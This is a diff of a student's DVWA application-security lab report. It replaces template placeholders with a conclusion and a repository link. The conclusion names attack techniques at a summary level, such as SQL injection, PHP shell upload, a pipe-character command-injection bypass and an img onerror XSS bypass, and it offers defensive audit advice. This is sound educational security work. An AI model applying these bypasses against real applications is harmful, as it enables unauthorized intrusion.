-openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
-  -keyout nginx.key -out nginx.crt
-```
-
-[Paste openssl output and describe the certificate details.]
-
-![https browser](images/https_browser.png)
-
-### HTTP vs HTTPS Traffic Comparison
-
-[Describe what you captured in Wireshark. On HTTP you can see plaintext credentials in the packet payload. On HTTPS the payload is encrypted and unreadable.]
-
-![wireshark http](images/wireshark_http.png)
-
-![wireshark https](images/wireshark_https.png)
-
----
-
 ## 7. Conclusion
 
-[Summarize the key takeaways. What did you observe about how defenses evolve from Low to High? What does the failure of partial fixes at Medium tell you about real-world application hardening? What would you recommend if you were auditing a production application?]
+Testing DVWA across three security levels made one thing clear: the difference between vulnerable and secure code is not about effort, it's about approach.
+
+At Low, every module fell to textbook attacks. No input validation, no output encoding, no access controls. SQL injection dumped the entire user table in seconds. A PHP shell uploaded without resistance gave direct command execution. Stored XSS fired on every page load. The application trusted everything the user sent, and paid for it across the board.
+
+Medium added filters, and those filters failed. Blacklists are inherently incomplete. For every character or pattern blocked, there is usually an encoding variant, an alternate syntax, or an overlooked operator that achieves the same result. The pipe character bypassed command injection filters. The `img onerror` attribute bypassed XSS script tag stripping. Burp Intruder ignored the 2-second brute force delay and cracked the password anyway. Medium demonstrated exactly why "add a filter" is not a security strategy.
+
+High used structural defenses: prepared statements that make SQL injection impossible by design, CSRF tokens that cannot be forged cross-origin, allowlists that reject anything not explicitly permitted. Most High-level modules held. The ones that did not, like XSS Stored, revealed that a single unprotected input field is enough.
+
+If I were auditing a production application, I would start by looking for any place user input touches a SQL query, shell command, file path, or HTML output. I would check whether the application uses parameterized queries consistently, not just in obvious places. I would look for CSRF protection on every state-changing request, not just password changes. I would check session token entropy and rotation on login. And I would treat any file upload endpoint as high-risk by default, verifying that MIME type, extension, and file content are all validated server-side.
+
+The broader takeaway is that most real-world breaches do not require novel techniques. They exploit the same classes of vulnerability demonstrated here, against applications that never moved past Medium.
 
 ---
 
 ## 8. GitHub Repository
 
-**Repository:** [https://github.com/yourusername/dvwa-security-lab](https://github.com/yourusername/dvwa-security-lab)
+**Repository:** [https://github.com/bilalahmedss/Application-Security-Testing](https://github.com/bilalahmedss/Application-Security-Testing)
 
 ---
 
